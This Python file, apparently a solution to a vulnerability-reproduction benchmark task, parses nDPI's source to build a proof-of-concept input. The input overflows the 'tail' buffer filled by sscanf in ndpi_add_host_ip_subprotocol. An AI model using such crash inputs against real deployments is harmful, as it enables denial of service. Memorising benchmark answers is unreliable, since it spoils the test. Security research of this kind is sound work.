import tarfile
import re
import os
import ast
import string


class Solution:
    def _read_file_from_tar(self, tf, basename):
        for member in tf.getmembers():
            if not member.isfile():
                continue
            if os.path.basename(member.name) == basename:
                try:
                    f = tf.extractfile(member)
                except Exception:
                    continue
                if f is None:
                    continue
                data = f.read()
                try:
                    return data.decode('utf-8', errors='ignore')
                except Exception:
                    return data.decode('latin-1', errors='ignore')
        return None

    def _extract_function(self, code, func_name):
        idx = code.find(func_name)
        if idx == -1:
            return None
        paren_idx = code.find('(', idx)
        if paren_idx == -1:
            return None
        brace_idx = code.find('{', paren_idx)
        if brace_idx == -1:
            return None
        n = len(code)
        i = brace_idx
        depth = 0
        start = brace_idx
        in_str = False
        str_char = ''
        in_line_comment = False
        in_block_comment = False

        while i < n:
            c = code[i]
            if in_line_comment:
                if c == '\n':
                    in_line_comment = False
                i += 1
                continue
            if in_block_comment:
                if c == '*' and i + 1 < n and code[i + 1] == '/':
                    in_block_comment = False
                    i += 2
                else:
                    i += 1
                continue
            if in_str:
                if c == '\\' and i + 1 < n:
                    i += 2
                    continue
                elif c == str_char:
                    in_str = False
                    i += 1
                    continue
                else:
                    i += 1
                    continue
            if c == '/' and i + 1 < n:
                nxt = code[i + 1]
                if nxt == '/':
                    in_line_comment = True
                    i += 2
                    continue
                if nxt == '*':
                    in_block_comment = True
                    i += 2
                    continue
            if c in ('"', "'"):
                in_str = True
                str_char = c
                i += 1
                continue
            if c == '{':
                depth += 1
                i += 1
                continue
            if c == '}':
                depth -= 1
                i += 1
                if depth == 0:
                    end = i
                    return code[start:end]
                continue
            i += 1
        return None

    def _find_tail_size(self, func_text):
        m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', func_text)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                return None
        return None

    def _extract_call_args(self, text, start_paren):
        n = len(text)
        i = start_paren
        if i >= n or text[i] != '(':
            return None, None
        depth = 0
        in_str = False
        str_char = ''
        in_line_comment = False
        in_block_comment = False
        while i < n:
            c = text[i]
            if in_line_comment:
                if c == '\n':
                    in_line_comment = False
                i += 1
                continue
            if in_block_comment:
                if c == '*' and i + 1 < n and text[i + 1] == '/':
                    in_block_comment = False
                    i += 2
                else:
                    i += 1
                continue
            if in_str:
                if c == '\\' and i + 1 < n:
                    i += 2
                    continue
                elif c == str_char:
                    in_str = False
                    i += 1
                    continue
                else:
                    i += 1
                    continue
            if c == '/' and i + 1 < n:
                nxt = text[i + 1]
                if nxt == '/':
                    in_line_comment = True
                    i += 2
                    continue
                if nxt == '*':
                    in_block_comment = True
                    i += 2
                    continue
            if c in ('"', "'"):
                in_str = True
                str_char = c
                i += 1
                continue
            if c == '(':
                depth += 1
                i += 1
                continue
            if c == ')':
                depth -= 1
                i += 1
                if depth == 0:
                    end = i
                    inner = text[start_paren + 1:end - 1]
                    return inner, end
                continue
            i += 1
        return None, None

    def _split_args(self, args_str):
        args = []
        cur = []
        depth_paren = depth_brace = depth_brack = 0
        in_str = False
        str_char = ''
        i = 0
        n = len(args_str)
        while i < n:
            c = args_str[i]
            if in_str:
                if c == '\\' and i + 1 < n:
                    cur.append(c)
                    cur.append(args_str[i + 1])
                    i += 2
                    continue
                elif c == str_char:
                    in_str = False
                    cur.append(c)
                    i += 1
                    continue
                else:
                    cur.append(c)
                    i += 1
                    continue
            if c in ('"', "'"):
                in_str = True
                str_char = c
                cur.append(c)
                i += 1
                continue
            if c == '(':
                depth_paren += 1
                cur.append(c)
                i += 1
                continue
            if c == ')':
                depth_paren -= 1
                cur.append(c)
                i += 1
                continue
            if c == '{':
                depth_brace += 1
                cur.append(c)
                i += 1
                continue
            if c == '}':
                depth_brace -= 1
                cur.append(c)
                i += 1
                continue
            if c == '[':
                depth_brack += 1
                cur.append(c)
                i += 1
                continue
            if c == ']':
                depth_brack -= 1
                cur.append(c)
                i += 1
                continue
            if c == ',' and depth_paren == 0 and depth_brace == 0 and depth_brack == 0:
                arg = ''.join(cur).strip()
                if arg:
                    args.append(arg)
                else:
                    args.append('')
                cur = []
                i += 1
                continue
            cur.append(c)
            i += 1
        if cur or not args_str:
            args.append(''.join(cur).strip())
        return args

    def _extract_format_string(self, arg):
        parts = []
        pattern = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
        for m in pattern.finditer(arg):
            content = m.group(1)
            try:
                decoded = ast.literal_eval('"' + content + '"')
            except Exception:
                try:
                    decoded = bytes(content, 'utf-8').decode('unicode_escape')
                except Exception:
                    decoded = content
            parts.append(decoded)
        if not parts:
            return None
        return ''.join(parts)

    def _parse_format_tokens(self, fmt):
        tokens = []
        i = 0
        n = len(fmt)
        while i < n:
            c = fmt[i]
            if c == '%':
                if i + 1 < n and fmt[i + 1] == '%':
                    tokens.append({'kind': 'literal', 'value': '%'})
                    i += 2
                    continue
                i += 1
                suppress = False
                width = None
                length_mod = ''
                if i < n and fmt[i] == '*':
                    suppress = True
                    i += 1
                width_val = 0
                has_width = False
                while i < n and fmt[i].isdigit():
                    has_width = True
                    width_val = width_val * 10 + int(fmt[i])
                    i += 1
                if has_width:
                    width = width_val
                if i < n and fmt[i] in 'hlLjzt':
                    length_mod += fmt[i]
                    i += 1
                    if i < n and fmt[i] in 'hl' and length_mod in ('h', 'l'):
                        length_mod += fmt[i]
                        i += 1
                if i >= n:
                    break
                convch = fmt[i]
                i += 1
                char_class = None
                if convch == '[':
                    start = i
                    while i < n and fmt[i] != ']':
                        i += 1
                    char_class = fmt[start:i]
                    if i < n and fmt[i] == ']':
                        i += 1
                token = {
                    'kind': 'conv',
                    'conv': convch,
                    'width': width,
                    'suppress': suppress,
                    'length': length_mod
                }
                if char_class is not None:
                    token['char_class'] = char_class
                tokens.append(token)
            elif c.isspace():
                if not tokens or tokens[-1]['kind'] != 'whitespace':
                    tokens.append({'kind': 'whitespace'})
                i += 1
            else:
                tokens.append({'kind': 'literal', 'value': c})
                i += 1
        return tokens

    def _parse_char_class(self, inner):
        complement = False
        if inner.startswith('^'):
            complement = True
            inner = inner[1:]
        chars = set()
        i = 0
        n = len(inner)
        while i < n:
            c = inner[i]
            if c == '\\' and i + 1 < n:
                i += 1
                c = inner[i]
                chars.add(c)
                i += 1
                continue
            if i + 2 < n and inner[i + 1] == '-' and inner[i + 2] != ']':
                start_c = c
                end_c = inner[i + 2]
                start_ord = min(ord(start_c), ord(end_c))
                end_ord = max(ord(start_c), ord(end_c))
                for code in range(start_ord, end_ord + 1):
                    chars.add(chr(code))
                i += 3
            else:
                chars.add(c)
                i += 1
        return complement, chars

    def _choose_char_for_class(self, inner):
        complement, chars = self._parse_char_class(inner)
        candidates = string.ascii_letters + string.digits + "._-/"
        if complement:
            for ch in candidates:
                if ch not in chars:
                    return ch
        else:
            for ch in candidates:
                if ch in chars:
                    return ch
        return 'A'

    def _find_sscanf_with_tail(self, func_text):
        for name in ('__isoc99_sscanf', 'sscanf'):
            search = name + '('
            pos = 0
            while True:
                idx = func_text.find(search, pos)
                if idx == -1:
                    break
                start_paren = idx + len(name)
                if start_paren >= len(func_text) or func_text[start_paren] != '(':
                    pos = idx + 1
                    continue
                args_str, end_pos = self._extract_call_args(func_text, start_paren)
                if args_str is None:
                    pos = idx + 1
                    continue
                args = self._split_args(args_str)
                if len(args) < 2:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                fmt = self._extract_format_string(args[1])
                if not fmt:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                tokens = self._parse_format_tokens(fmt)
                if not tokens:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                pointer_args = args[2:]
                tail_idx = None
                for j, a in enumerate(pointer_args):
                    if re.search(r'\btail\b', a):
                        tail_idx = j
                        break
                if tail_idx is not None:
                    conv_token_indices = []
                    for ti, tok in enumerate(tokens):
                        if tok['kind'] != 'conv':
                            continue
                        if tok.get('conv') == 'n':
                            continue
                        if tok.get('suppress'):
                            continue
                        conv_token_indices.append(ti)
                    if tail_idx < len(conv_token_indices):
                        target_token_index = conv_token_indices[tail_idx]
                        return fmt, tokens, target_token_index
                pos = end_pos if end_pos is not None else idx + 1
        fmt_best = None
        tokens_best = None
        target_idx_best = None
        for name in ('__isoc99_sscanf', 'sscanf'):
            search = name + '('
            pos = 0
            while True:
                idx = func_text.find(search, pos)
                if idx == -1:
                    break
                start_paren = idx + len(name)
                if start_paren >= len(func_text) or func_text[start_paren] != '(':
                    pos = idx + 1
                    continue
                args_str, end_pos = self._extract_call_args(func_text, start_paren)
                if args_str is None:
                    pos = idx + 1
                    continue
                args = self._split_args(args_str)
                if len(args) < 2:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                fmt = self._extract_format_string(args[1])
                if not fmt:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                tokens = self._parse_format_tokens(fmt)
                if not tokens:
                    pos = end_pos if end_pos is not None else idx + 1
                    continue
                target = None
                for ti in range(len(tokens) - 1, -1, -1):
                    tok = tokens[ti]
                    if tok['kind'] == 'conv' and tok.get('conv') in ('s', '['):
                        target = ti
                        break
                if target is not None:
                    fmt_best = fmt
                    tokens_best = tokens
                    target_idx_best = target
                pos = end_pos if end_pos is not None else idx + 1
        if fmt_best is not None:
            return fmt_best, tokens_best, target_idx_best
        return None

    def _generate_input_from_tokens(self, tokens, target_token_index, overflow_len):
        out_parts = []
        for idx, tok in enumerate(tokens):
            kind = tok['kind']
            if kind == 'literal':
                out_parts.append(tok['value'])
            elif kind == 'whitespace':
                out_parts.append(' ')
            else:
                convch = tok.get('conv')
                if convch == 'n':
                    continue
                is_target = (idx == target_token_index)
                width = tok.get('width')
                if convch in 'diouxX':
                    token_str = '1'
                elif convch in 'eEfFgGaA':
                    token_str = '1.5'
                elif convch == 'p':
                    token_str = '1'
                elif convch == 'c':
                    num = width if width is not None and width > 0 else 1
                    token_str = 'Z' * num
                elif convch == 's':
                    if is_target:
                        length = overflow_len
                    else:
                        if width is not None and width > 0:
                            length = min(width, 3)
                        else:
                            length = 3
                    token_str = 'A' * length
                elif convch == '[':
                    inner = tok.get('char_class', '')
                    ch = self._choose_char_for_class(inner)
                    if is_target:
                        length = overflow_len
                    else:
                        if width is not None and width > 0:
                            length = min(width, 3)
                        else:
                            length = 3
                    token_str = ch * length
                else:
                    token_str = '1'
                out_parts.append(token_str)
        return ''.join(out_parts)

    def _default_poc(self):
        return (b"A" * 128) + b"\n"

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                ndpi_code = self._read_file_from_tar(tf, 'ndpi_main.c')
        except Exception:
            return self._default_poc()
        if not ndpi_code:
            return self._default_poc()
        func_text = self._extract_function(ndpi_code, 'ndpi_add_host_ip_subprotocol')
        if not func_text:
            return self._default_poc()
        tail_size = self._find_tail_size(func_text)
        call_info = self._find_sscanf_with_tail(func_text)
        if not call_info:
            return self._default_poc()
        fmt_str, tokens, target_token_index = call_info
        if tail_size and tail_size > 0:
            overflow_len = max(tail_size * 4, tail_size + 32)
        else:
            overflow_len = 256
        poc_str = self._generate_input_from_tokens(tokens, target_token_index, overflow_len)
        if not poc_str.endswith("\n"):
            poc_str += "\n"
        try:
            return poc_str.encode('ascii', errors='ignore')
        except Exception:
            return self._default_poc()
